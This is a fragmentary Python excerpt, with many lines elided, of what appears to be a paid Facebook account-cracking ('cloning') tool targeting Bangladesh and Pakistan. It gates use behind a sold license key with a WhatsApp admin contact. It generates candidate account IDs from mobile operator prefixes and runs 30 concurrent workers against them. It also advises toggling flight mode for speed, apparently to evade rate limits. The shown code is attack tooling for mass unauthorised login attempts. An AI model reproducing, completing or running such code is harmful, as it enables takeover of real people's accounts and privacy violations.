...
if key2 in b:
    ...
    os.system("clear")
    print (logo)
    print("mbd 7 day 100 tk033[1;37m and 15 day 200")
    print("mbd 7 day 120 tk033[1;37m and 15 day 240")
    print("Your key  : "+key2)
    print("\n\t\t033[1;32mContact033[1;37m Admin ")
    os.system('am start https://wa.me/+8801766804626?text=380411c6d11c_CYTHON___plz approve your FB-lover tols' )
    exit()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m \x1b[38;5;208m\033[1;32mUse flight mo\033[1;37mde for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                ...
                                clear()
                                print(' \033[1;32m[1] Bangla\033[1;37mdesh \n \033[1;32m[2] Pakistan\033[1;37m cloning \n [0] \033[1;32mBa\033[1;37mck')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        bd()
...
def pak():
                ...
                with tred(max_workers=30) as Tonmoy:     
                        ...
                        print(f'\033[1;32m \x1b[38;5;208m\033[1;32mUse flight mo\033[1;37mde for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: \033[1;31m016,\033[1;31m(\033[1;32mbest 017\033[1;31m),\033[1;31m018,\033[1;31m019,\033[1;31m014,\033[1;31m013,')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;32m example: \033[1;37m2000, 3000, 5000, 10000,50000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                ...
                with tred(max_workers=30) as Tonmoy:     
                        ...
                        print(f'\033[1;37m \x1b[38;5;208m\033[1;32mUse flight mo\033[1;37mde for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
